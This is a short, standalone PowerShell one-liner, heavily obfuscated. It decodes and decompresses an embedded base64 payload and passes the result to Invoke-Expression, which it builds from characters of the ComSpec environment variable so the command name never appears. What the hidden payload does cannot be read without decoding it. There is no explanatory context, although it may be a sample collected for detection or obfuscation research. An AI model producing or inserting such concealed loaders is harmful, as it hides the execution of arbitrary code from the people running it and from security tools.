(
    nEW-objECt  SYstem.iO.COMPreSsIon.deFlaTEStREAm( 
        [IO.mEmORYstreAM][coNVERt]::FROMBAse64sTRING('UzF19/UJV7BVUErLSUyvNk5NMTM3TU0zMDYxNjSxNDcyNjexTDY2SUu0NDRITDWpVQIA'),
        [io.COmPREssioN.coMpreSSioNmODE]::DeCoMpReSS
    ) 
    | %{ 
        nEW-objECt  sYStEm.Io.StREAMrEADeR(
            $_,
            [TeXT.encodiNG]::AsCii
        )
    } 
    | %{ 
        $_.READTOENd()
    }
)
| & (
    $eNV:cOmSPEc[4,15,25]-JOin''
)